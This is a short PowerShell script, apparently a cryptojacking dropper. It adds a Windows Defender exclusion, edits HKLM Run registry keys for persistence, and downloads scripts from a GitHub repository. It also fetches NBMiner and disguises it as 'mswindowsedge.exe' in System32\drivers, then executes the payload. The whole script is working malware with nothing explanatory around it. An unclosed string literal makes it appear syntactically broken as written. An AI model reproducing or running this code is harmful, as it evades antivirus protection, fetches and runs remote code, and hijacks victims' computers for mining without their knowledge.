$Folder = 'C:\Windows\System32\drivers\cmd.bat'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
    "Path exists!"
} else {

    "Path doesn't
    Add-MpPreference -ExclusionPath C:\Windows\System32\drivers ; cd C:\Windows\System32\drivers ; powershell.exe Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name System32 ; Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name Windows ; Invoke-WebRequest "https://raw.githubusercontent.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/main/Windowsmsedge.vbs" -OutFile Windowsmsedge.vbs ; New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name mswindowsedge -PropertyType String -Value C:\Windows\System32\drivers\Windowsmsedge.vbs ; rm C:\Windows\System32\Microsoft\cmd.bat ; rm C:\Windows\System32\Microsoft\System.ps1 ; rm C:\Windows\System32\Microsoft\Win_System.bat ; rm C:\Windows\System32\Microsoft\script12.ps1 ; cd C:\Windows\System32\drivers\ ; cd C:\Windows\System32\drivers ; mkdir heeeeeeeeeeeeeeee ; cd .\heeeeeeeeeeeeeeee ; Invoke-WebRequest -uri https://dl.nbminer.com/NBMiner_42.3_Win.zip -outfile nbminer.zip ; Expand-Archive .\nbminer.zip ; cd .\nbminer\NBMiner_Win\ ; Rename-Item .\nbminer.exe .\mswindowsedge.exe ; mv .\mswindowsedge.exe C:\Windows\System32\drivers ;  cd C:\Windows\System32\drivers ; rm -R .\heeeeeeeeeeeeeeee ; Invoke-WebRequest "https://raw.githubusercontent.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/main/cmd.bat" -OutFile cmd.bat ; cd C:\Windows\System32 ; Invoke-WebRequest "https://raw.githubusercontent.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/main/System.ps1" -OutFile System.ps1 ; Invoke-WebRequest "https://raw.githubusercontent.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/main/Win_System.bat" -OutFile Win_System.bat; C:\Windows\System32\drivers\cmd.bat

}
